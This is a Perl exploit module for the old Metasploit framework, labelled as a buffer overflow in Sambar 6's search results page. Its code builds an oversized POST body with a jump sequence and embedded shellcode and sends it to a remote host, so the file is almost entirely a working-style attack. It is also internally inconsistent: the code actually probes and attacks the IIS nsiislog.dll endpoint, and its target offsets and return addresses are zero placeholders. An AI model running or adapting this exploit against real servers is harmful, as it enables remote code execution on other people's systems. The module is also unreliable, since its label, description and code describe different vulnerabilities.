package Msf::Exploit::sambar6_search_results;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'Sambar 6 Search Results Buffer Overflow',
    'Version'  => '1.0',
    'Author'  => 'H D Moore <hdm [at] metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Space'  => 1024,
                 'BadChars'  => 
                    join("", map { $_=chr($_) } (0x00 .. 0x2f)).
                    join("", map { $_=chr($_) } (0x3a .. 0x40)).
                    join("", map { $_=chr($_) } (0x5B .. 0x60)).
                    join("", map { $_=chr($_) } (0x7B .. 0xC0)),
                 },
    
    'Description'  =>  "This exploits a buffer overflow found in the /search/results.stm ".
                       "application that comes with Sambar 6.",
    
    'Refs'  =>  [

                ],
    'Targets' => [
                   ['Windows 2000', 0, 0],
                   ['Windows XP',   0, 0],

                 ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    
    my $s = Msf::Socket->new( {"SSL" => $self->GetVar("SSL")} );
    if (! $s->tcp($target_host, $target_port))
    {
        $self->SetError($s->get_error);
        return undef;
    }
 
    $s->send("GET /scripts/nsiislog.dll HTTP/1.1\r\nHost: $target_host:$target_port\r\n\r\n");

    my $r = $s->recv(5);

    if ($r =~ /NetShow ISAPI/)
    {
        $self->PrintLine("[*] Found /scripts/nsiislog.dll ;)");
        return(1);
    } else {
        
        $self->PrintLine("The nsiislog.dll ISAPI does not appear to be installed");
        return(0);
    }
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

    my @targets = @{$self->Targets};
    if ($target_idx == 0)
    {
        shift(@targets);
    } else {
        @targets = ( $targets[$target_idx] );
    }
    

    foreach my $target (@targets)
    {
        $self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

        my $request = 
        "POST /scripts/nsiislog.dll HTTP/1.1\r\n".
        "Host: $target_host:$target_port\r\n".
        "User-Agent: NSPlayer/2.0\r\n".
        "Content-Type: application/x-www-form-urlencoded\r\n";

        my @fields = split(/\s+/, "date time c-dns cs-uri-stem c-starttime ".
                                  "x-duration c-rate c-status c-playerid c-playerversion ".
                                  "c-playerlanguage cs(User-Agent) cs(Referer) c-hostexe ");                         
        my $boom;
        foreach my $var (@fields) { $boom .= "$var=BOOM&"; }

        my $pattern = "M" x 65535;

        substr($pattern, $target->[1],  4, pack("L", $target->[2]));
        substr($pattern, $target->[1] - 4, 4, "\xeb\x08\xeb\x08");
        substr($pattern, $target->[1] + 4, length($shellcode), $shellcode);

        $boom .= "c-ip=" . $pattern;
        $request .= "Content-Length: " . length($boom) . "\r\n\r\n" . $boom;
        
        my $s = Msf::Socket->new({"SSL" => $self->GetVar("SSL")});
        if (! $s->tcp($target_host, $target_port))
        {
            $self->PrintLine("[*] Error: could not connect: " . $s->get_error());
            exit(0);
        }

        $self->PrintLine("[*] Sending " .length($request) . " bytes to remote host.");
        $s->send($request);
        
        $self->PrintLine("[*] Waiting for a response...");
        my $r = $s->recv(5);
        sleep(2);
        $s->close();
    }
    
    exit(0);
}
1;
